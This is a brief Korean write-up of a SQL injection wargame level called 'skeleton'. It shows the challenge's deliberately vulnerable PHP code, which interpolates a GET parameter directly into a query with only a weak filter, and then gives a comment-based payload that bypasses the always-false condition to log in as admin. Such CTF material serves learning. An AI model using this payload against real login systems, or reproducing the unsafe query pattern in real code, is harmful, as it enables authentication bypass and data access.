# SKELETON

## Problem
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

## Inspection
* `select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0`
	- 파라미터로 `pw`를 넘긴다.
	- 뒤의 `and 1=0` 때문에 조건문이 항상 거짓으로 된다.
* `if($result['id'] == 'admin') solve("skeleton");`
	- 쿼리문의 결과의 `id`가 `admin`이라면 통과한다.
	
## Solution
* 주석처리와 `and`, `or` 연산자의 우선순위를 이용한다.
	- `' or id='admin' -- `(맨 뒤 띄어쓰기에 유의한다.)